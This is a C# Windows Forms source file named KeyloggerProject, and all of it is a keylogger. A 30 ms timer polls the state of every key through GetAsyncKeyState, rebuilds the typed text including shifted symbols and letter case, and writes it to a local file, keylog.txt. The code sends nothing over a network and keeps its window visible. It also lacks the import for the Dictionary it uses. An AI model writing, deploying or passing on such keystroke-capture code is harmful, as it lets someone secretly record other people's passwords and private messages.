

namespace KeyloggerProject
{
    using System;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    public partial class Form1 : Form
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        Timer timer;
        StreamWriter sw;

        public Form1()
        {
            InitializeComponent();
            timer = new Timer();
            timer.Interval = 30;
            timer.Tick += Timer_Tick;
            timer.Start();

            sw = new StreamWriter("keylog.txt", false);
        }

        private string currentText = "";
        private Dictionary<Keys, DateTime> keyLastPressed = new Dictionary<Keys, DateTime>();
        private int keyRepeatDelayMs = 150;

        private void Timer_Tick(object sender, EventArgs e)
        {
            DateTime now = DateTime.Now;

            bool isShiftPressed =
              (GetAsyncKeyState((int)Keys.LShiftKey) & 0x8001) != 0 ||
              (GetAsyncKeyState((int)Keys.RShiftKey) & 0x8001) != 0;
            bool useUpperCase = isShiftPressed ^ Console.CapsLock;
            this.Text = $"Shift: {isShiftPressed} | CapsLock: {Console.CapsLock} | Upper: {useUpperCase}";




            for (int i = 0; i < 255; i++)
            {
                int state = GetAsyncKeyState(i);
                Keys key = (Keys)i;

                if ((state & 0x8000) != 0)
                {
                    if (!keyLastPressed.ContainsKey(key) || (now - keyLastPressed[key]).TotalMilliseconds >= keyRepeatDelayMs)
                    {
                        keyLastPressed[key] = now;

                        if (key == Keys.Back && currentText.Length > 0)
                        {
                            currentText = currentText.Substring(0, currentText.Length - 1);
                        }
                        else if (key == Keys.Space)
                        {
                            currentText += " ";
                        }
                        else if (key == Keys.Enter)
                        {
                            currentText += Environment.NewLine;
                        }
                        else if ((key >= Keys.D0 && key <= Keys.D9) && isShiftPressed)
                        {
                            currentText += GetShiftSymbol(key);
                        }
                        else if ((key >= Keys.D0 && key <= Keys.D9))
                        {
                            currentText += ConvertKey(key); 
                        }
                        else if (key >= Keys.A && key <= Keys.Z)
                        {
                            string letter = ConvertUpperLower(key, useUpperCase);
                            currentText += letter;

                        }

                        sw.Write(currentText);
                        sw.Flush();
                        currentText = "";
                    }
                }
            }

        }
        private string GetShiftSymbol(Keys key)
        {
            switch (key)
            {
                case Keys.D1: return "!";
                case Keys.D2: return "@"; 
                case Keys.D3: return "#";
                case Keys.D4: return "$";
                case Keys.D5: return "%";
                case Keys.D6: return "^";
                case Keys.D7: return "&";
                case Keys.D8: return "*";
                case Keys.D9: return "(";
                case Keys.D0: return ")";
                default: return "";
            }
        }


        private string ConvertKey(Keys key)
        {
            if (key >= Keys.D0 && key <= Keys.D9)
                return ((char)('0' + (key - Keys.D0))).ToString();

            return key.ToString(); 
        }
        private string ConvertUpperLower(Keys key, bool toUpper)
        {
            if (key >= Keys.A && key <= Keys.Z)
            {
                char baseChar = (char)('a' + (key - Keys.A));
                return toUpper ? char.ToUpper(baseChar).ToString() : baseChar.ToString();
            }

            return "";

        }



        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            sw.Close();
            base.OnFormClosed(e);
        }
    }
}
